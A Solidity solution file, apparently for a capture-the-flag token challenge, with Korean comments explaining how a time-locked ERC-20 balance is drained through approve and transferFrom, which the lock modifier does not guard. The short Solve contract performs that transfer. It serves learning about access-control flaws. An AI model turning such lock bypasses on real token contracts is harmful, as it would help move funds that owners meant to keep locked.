// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 동작 방식 정리
 * 1. 컨트랙트 생성 시 player (= 공격자) 주소로 토큰이 민트됨
 * 2. timeLock이 2035년으로 지정되어 있음
 * 3. transfer로 player가 직접 전송을 시도할 경우 lockTokens 제한자에 의해 토큰 직접 전송이 제한됨
 *
 * 목표
 * 컨트랙트 내 player 잔액 전액 인출 (ERC-20 표준 제대로만 알면 쉬운 문제)
 *
 * 공격 방식
 * 1. ERC-20 토큰의 기능 중 transferFrom 함수 기능을 이용하여 공격자의 토큰 잔액을 성공적으로 인출하기 위해 다른 주소로 사용
 * 2. transferFrom 기능을 사용하기 위해 approve 함수와 balanceOf 함수를 이용해서 player가 player의 잔액 전액을 
 *    spender에게 공격자 CA가 송금하도록 제3자 사용 허용시키기
 * 3. approve 함수로 허용 후 공격자 CA를 통해 transferFrom 함수를 사용하여 player에서 spender로 송금 실시
 */

interface ERC20 {
    function approve(address spender, uint256) external;
    function balanceOf(address account) external returns (uint256);
    function transferFrom(address from, address to, uint256) external returns (bool);
}

contract Solve {
    address owner;
    address spender;
    address target;

    constructor(address _target, address _owner, address _spender) {
        target = _target;
        owner = _owner;
        spender = _spender;
    }

    function attack(uint256 _balance) public {
        ERC20(target).transferFrom(owner, spender, _balance);
    }
}